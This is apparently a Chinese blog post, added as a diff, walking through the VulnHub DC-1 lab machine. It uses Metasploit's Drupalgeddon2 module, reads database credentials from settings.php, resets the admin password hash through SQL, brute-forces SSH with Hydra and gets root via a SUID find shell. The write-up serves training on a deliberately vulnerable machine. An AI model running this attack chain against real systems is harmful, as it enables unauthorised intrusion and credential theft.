@@ -1,0 +1,264 @@
+<hr>
+<h2 id="title-DC-1靶场记录date-2022-03-15-09-43-24tags-DC靶场typora-root-url"><a href="#title-DC-1靶场记录date-2022-03-15-09-43-24tags-DC靶场typora-root-url" class="headerlink" title="title: DC-1靶场记录date: 2022-03-15 09:43:24tags: DC靶场typora-root-url: .&#x2F;.."></a>title: DC-1靶场记录<br>date: 2022-03-15 09:43:24<br>tags: DC靶场<br>typora-root-url: .&#x2F;..</h2><h2 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一. 环境搭建"></a>一. 环境搭建</h2><h3 id="1-1、DC-1靶场机"><a href="#1-1、DC-1靶场机" class="headerlink" title="1.1、DC-1靶场机"></a>1.1、DC-1靶场机</h3><p>官网下载 <a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
+<h3 id="1-2、安装过程"><a href="#1-2、安装过程" class="headerlink" title="1.2、安装过程"></a>1.2、安装过程</h3><p>解压后得到个.ova文件</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715602590543-4.png" alt="Image"></p>
+<p>进入Vm打开，然后等待导入完毕。</p>
+<p>然后再更改kali的网络连接模式为桥接模式，让DC靶机跟kali处于同一网段，这用kali才能扫出DC的主机，当然也可以设置为net，但必须DC-1靶机也设为net。</p>
+<h2 id="二-渗透过程"><a href="#二-渗透过程" class="headerlink" title="二. 渗透过程"></a>二. 渗透过程</h2><h3 id="2-1、信息收集"><a href="#2-1、信息收集" class="headerlink" title="2.1、信息收集"></a>2.1、信息收集</h3><p>①探测目标IP地址</p>
+<p>探测主机的工具有很多，常见的有arp-scan、nmap还有netdiscover</p>
+<p>arp-scan -l</p>
+<p>该命令是探测当前网段的所有存活主机的IP地址</p>
+<p>可以看到当前网段内存活的主机IP为192.168.228.132</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715602783200-6.png" alt="Image"></p>
+<p>可以用nmap去探测一下该IP开了什么端口。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715602806018-8.png" alt="Image"></p>
+<p>可以看到这个ip开了80端口，我们可以直接浏览器访问这个Ip地址。</p>
+<p>利用火绒插件wappalyzer，查看站点信息，也可以自己判断，网页一看cms就是drupal</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715602827594-10.png" alt="Image"></p>
+<p>当然也可以用kali自带的工具whatweb扫</p>
+<pre><code class="shell">whatweb -v 192.168.228.132
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715602851720-12.png" alt="Image"></p>
+<p>经过信息收集之后我们可以得到如下信息</p>
+<pre><code>CMS是Drupal
+Apache 2.2.22
+PHP 5.4.45
+jQuery 1.4.4
+</code></pre>
+<h3 id="2-2、漏洞查找与利用"><a href="#2-2、漏洞查找与利用" class="headerlink" title="2.2、漏洞查找与利用"></a>2.2、漏洞查找与利用</h3><p>知道cms，我们一般从cms出发找漏洞，百度一下drupal漏洞</p>
+<p>这是一个框架漏洞，我们可以用kali自带的工具Metasploit（目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一），找一下漏洞。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715602938674-14.png" alt="Image"></p>
+<p>先打开工具</p>
+<pre><code class="shell">msfconsole
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715602965162-16.png" alt="Image"></p>
+<p>用search命令去搜索我们要渗透的网站框架</p>
+<pre><code class="shell">search Drupal
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715602993590-18.png" alt="Image"></p>
+<p>可以看到这个cms框架还是有挺多漏洞的，这里我们利用漏洞等级较高的，我们选择2018年的那个漏洞</p>
+<p>使用use命令 + 漏洞名称，指定我们要利用的漏洞</p>
+<pre><code class="shell">use exploit/unix/webapp/drupal_drupalgeddon2
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603017915-20.png" alt="Image"></p>
+<p>接着看一下该漏洞模块参数</p>
+<pre><code class="shell">show options
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603040336-22.png" alt="Image"></p>
+<p>Current Setting是目前设置的内容</p>
+<p>Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置</p>
+<p>就上面来说RHOSTS需要set。</p>
+<pre><code>set 192.168.228.132
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603061132-24.png" alt="Image"></p>
+<p>设置完参数之后就可以run了</p>
+<p>出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功啦，接下来我们可以直接上shell</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603077084-26.png" alt="Image"></p>
+<h2 id="三-Getshell"><a href="#三-Getshell" class="headerlink" title="三. Getshell"></a>三. Getshell</h2><h3 id="3-1、获取普通shell"><a href="#3-1、获取普通shell" class="headerlink" title="3.1、获取普通shell"></a>3.1、获取普通shell</h3><p>shell</p>
+<p>获取一下普通的shell，然后执行ls命令</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603112429-31.png" alt="Image"></p>
+<h3 id="3-2、获取交互shell"><a href="#3-2、获取交互shell" class="headerlink" title="3.2、获取交互shell"></a>3.2、获取交互shell</h3><p>这样看起来有点不习惯，不过我们可以利用python实现互交shell，这样就好看一点。</p>
+<pre><code class="shell">python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p>然后查看flag1.txt</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603210599-33.png" alt="Image"></p>
+<p>每个好的CMS都需要一个配置文件，你也一样。这个先放着，看看还有没有其他flag文件</p>
+<pre><code>find / -name flag*
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603234181-35.png" alt="Image"></p>
+<p>就只有这一个flag文件，上面的flag说每个cms都需要一个好的配置文件，我们去搜一下Drupal配置文件，路径挺复杂的不过知道名字叫settings.php，我们可以用命令直接搜索并打开，内联执行</p>
+<pre><code>cat `find / -name settings.php`
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603259951-37.png" alt="Image"></p>
+<p>在这里我们得到了数据库用户名和密码，直接连接数据库</p>
+<pre><code>mysql -udbuser -pR0ck3t
+
+show databases;#查看数据库
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603295500-39.png" alt="Image"></p>
+<p>有一个名为drupaldb的数据库，进入这个数据库看一下，并查看表</p>
+<pre><code>use drupaldb;
+
+show tables;
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603313625-41.png" alt="Image"></p>
+<p>有一张users表，查看一下表的内容</p>
+<pre><code class="SQL">select * from users;
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603356260-43.png" alt="Image"></p>
+<p>加一个admin。</p>
+<p>修改admin密码</p>
+<p>我们得先找到加密文件，Drupal的加密脚本在</p>
+<pre><code>/var/www/scripts/password-hash.sh
+</code></pre>
+<p>目录下，先退出mysql，打开加密脚本</p>
+<pre><code>cat /var/www/scripts/password-hash.sh
+</code></pre>
+<pre><code class="php">#!/usr/bin/php
+&lt;?php
+
+
+/**
+* Drupal hash script - to generate a hash from a plaintext password
+*
+* Check for your PHP interpreter - on Windows you&#39;ll probably have to
+* replace line 1 with
+*   #!c:/program files/php/php.exe
+*
+* @param password1 [password2 [password3 ...]]
+*  Plain-text passwords in quotes (or with spaces backslash escaped).
+*/
+
+
+if (version_compare(PHP_VERSION, &quot;5.2.0&quot;, &quot;&lt;&quot;)) {
+  $version  = PHP_VERSION;
+  echo &lt;&lt;&lt;EOF
+
+
+ERROR: This script requires at least PHP version 5.2.0. You invoked it with
+       PHP version {$version}.
+\n
+EOF;
+  exit;
+}
+
+
+$script = basename(array_shift($_SERVER[&#39;argv&#39;]));
+
+
+if (in_array(&#39;--help&#39;, $_SERVER[&#39;argv&#39;]) || empty($_SERVER[&#39;argv&#39;])) {
+  echo &lt;&lt;&lt;EOF
+
+
+Generate Drupal password hashes from the shell.
+
+
+Usage:        {$script} [OPTIONS] &quot;&lt;plan-text password&gt;&quot;
+Example:      {$script} &quot;mynewpassword&quot;
+
+
+All arguments are long options.
+
+
+  --help      Print this page.
+
+
+  --root &lt;path&gt;
+
+
+              Set the working directory for the script to the specified path.
+              To execute this script this has to be the root directory of your
+              Drupal installation, e.g. /home/www/foo/drupal (assuming Drupal
+              running on Unix). Use surrounding quotation marks on Windows.
+
+
+  &quot;&lt;password1&gt;&quot; [&quot;&lt;password2&gt;&quot; [&quot;&lt;password3&gt;&quot; ...]]
+
+
+              One or more plan-text passwords enclosed by double quotes. The
+              output hash may be manually entered into the {users}.pass field to
+              change a password via SQL to a known value.
+
+
+To run this script without the --root argument invoke it from the root directory
+of your Drupal installation as
+
+
+  ./scripts/{$script}
+\n
+EOF;
+  exit;
+}
+
+
+$passwords = array();
+
+
+// Parse invocation arguments.
+while ($param = array_shift($_SERVER[&#39;argv&#39;])) {
+  switch ($param) {
+    case &#39;--root&#39;:
+      // Change the working directory.
+      $path = array_shift($_SERVER[&#39;argv&#39;]);
+      if (is_dir($path)) {
+        chdir($path);
+      }
+      break;
+    default:
+      // Add a password to the list to be processed.
+      $passwords[] = $param;
+      break;
+  }
+}
+
+
+define(&#39;DRUPAL_ROOT&#39;, getcwd());
+
+
+include_once DRUPAL_ROOT . &#39;/includes/password.inc&#39;;
+include_once DRUPAL_ROOT . &#39;/includes/bootstrap.inc&#39;;
+
+
+foreach ($passwords as $password) {
+  print(&quot;\npassword: $password \t\thash: &quot;. user_hash_password($password) .&quot;\n&quot;);
+}
+print(&quot;\n&quot;);
+</code></pre>
+<p>看到这里我们可以直接运行这个加密脚本，后面跟上我们的密码明文，他就会给我们输出出来密文。这里我们设置一个密码123456</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603441738-45.png" alt="Image"></p>
+<pre><code>php /var/www/scripts/password-hash.sh 123456
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603459651-47.png" alt="Image"></p>
+<p>我们把这个密文去数据库里面修改amdin,或者Fred的密码</p>
+<pre><code class="sql">mysql -udbuser -pR0ck3t
+
+use drupaldb;update users set pass = &quot;$S$DSO2OjMqCiOC0.Qkey6QmlMhSVHY1LOlP9sk3ONvG7t3OyoqiThi&quot; where name = &#39;admin&#39; or name = &#39;Fred&#39;;
+</code></pre>
+<p>我们可以看到已经修改成我们生成的密码了，这样就可以直接去网站里面登录进去了。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603529262-49.png" alt="Image"></p>
+<p>登陆成功</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603543803-51.png" alt="Image"></p>
+<p>这里有第三个flag3</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603563545-53.png" alt="Image"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603578081-55.png" alt="Image"></p>
+<p>登进去就找到了flag3，提示了我们一些信息passwd和shadow，明显就是linux的文件</p>
+<p>&#x2F;etc&#x2F;passwd    该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读</p>
+<p>&#x2F;etc&#x2F;shadow    该文件存储了系统用户的密码等信息，只有root权限用户才能读取</p>
+<p>接着我们查看一下用户信息</p>
+<pre><code>cat /etc/passwd
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603630114-57.png" alt="Image"></p>
+<p>可以看到有flag4这个用户，我们有两个方法拿到这个用户的密码，一个是爆破，另一个就是提权打开shadow文件查看密码</p>
+<h2 id="四-用户密码爆破"><a href="#四-用户密码爆破" class="headerlink" title="四.用户密码爆破"></a>四.用户密码爆破</h2><p>事先参考SSH</p>
+<p>利用工具Hydra爆破flag4的密码</p>
+<pre><code>hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.228.132
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603690426-59.png" alt="Image"></p>
+<p>得到密码，orange,然后我们用kali连接</p>
+<pre><code>ssh flag4@192.168.228.132
+</code></pre>
+<p>连接成功，查看flag</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603713182-61.png" alt="Image"></p>
+<p>提示我们去root里面找flag</p>
+<h2 id="五-Linux提权"><a href="#五-Linux提权" class="headerlink" title="五.Linux提权"></a>五.Linux提权</h2><p>需要用到SUID提权，参考 <a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p>
+<p>利用find命令，找查具有SUID权限的可执行二进制文件</p>
+<pre><code class="shell">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p>这个命令的作用是在根目录 <strong>&#x2F;</strong> 下查找所有文件，如果文件的用户 ID 位设置为 SUID（SUID 是 setuid 的缩写，表示当该程序运行时将以拥有者的权限运行），则列出它们的文件名。并且将所有标准错误输出到 <strong>&#x2F;dev&#x2F;null</strong> 中，以避免在屏幕上显示不必要的错误信息。</p>
+<p>下面是各个参数的解释：</p>
+<ul>
+<li><strong>find</strong>: 命令名，用于在指定的路径下查找文件和目录。</li>
+<li><strong>&#x2F;</strong>: 查找的路径，本例中是根目录。</li>
+<li><strong>-perm</strong>: 参数选项，用于按照文件权限查找文件。</li>
+<li><strong>-u&#x3D;s</strong>: 参数选项，用于查找文件的用户 ID 位设置为 SUID（即文件所有者执行时具有其权限）的文件。<strong>u</strong> 表示用户（user），**&#x3D;** 表示精确匹配，<strong>s</strong> 表示设置了 SUID。</li>
+<li><strong>-type</strong>: 参数选项，用于指定要查找的文件类型，<strong>f</strong> 表示查找普通文件（即不包括目录和链接等其他类型的文件）。</li>
+<li><strong>2&gt;&#x2F;dev&#x2F;null</strong>: 将标准错误输出重定向到 <strong>&#x2F;dev&#x2F;null</strong> 设备，即将错误信息丢弃不予显示。</li>
+</ul>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603765887-63.png" alt="Image"></p>
+<p>find比较常用，可以执行root权限的命令找查文件</p>
+<pre><code class="shell">find / -name index.php -exec &quot;/bin/sh&quot; \;
+</code></pre>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603811035-65.png" alt="Image"></p>
+<p>可以看到我们已经是root权限了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715603836711-67.png" alt="Image"></p>
+<p>拿到最终的flag</p>
